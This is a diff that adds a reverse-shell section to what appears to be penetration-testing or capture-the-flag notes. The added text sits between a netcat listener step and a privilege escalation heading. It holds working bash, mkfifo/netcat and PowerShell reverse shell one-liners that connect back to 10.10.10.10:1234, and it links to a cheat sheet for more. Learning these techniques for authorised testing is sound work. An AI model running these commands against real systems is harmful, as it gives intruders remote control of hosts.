@@ -309,5 +309,26 @@ nc -nlvp 9999
 We now have a netcat listener waiting for a connection. We will trigger the reverse shell connection from the target machine back to our host machine with the netcat listener.
 
 2. Execute the reverse shell command via the exploited vulnerability
+The command to execute depends on the operating system which our target is running. Some reverse shell commands can be more reliable than others.
+Bash code for Linux compromised hosts:
+```
+bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
+```
+OR
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
+```
+Powershell code for Windows compromised hosts
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+```
+The key is utilizing the exploit we have over the remote host to execute one of the above reverse shell commands.
+
+> There are other shells such as Bind Shell and Web Shell. For more reverse shell commands which cover more types of compromised host, check out [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).<br>
+
+#### Upgrading your shell
+You may realize that after gaining a shell, its functionalities are limited compared to our shell in our own terminal. We need to upgrade our TTY which is achieved via mapping our terminal TTY with the target's TTY.
+
+To learn more, view [Upgrading your Reverse Shell](https://nickchua.com/2023/12/07/Upgrading-your-reverse-shell.html).
 
 ### Privilege Escalation
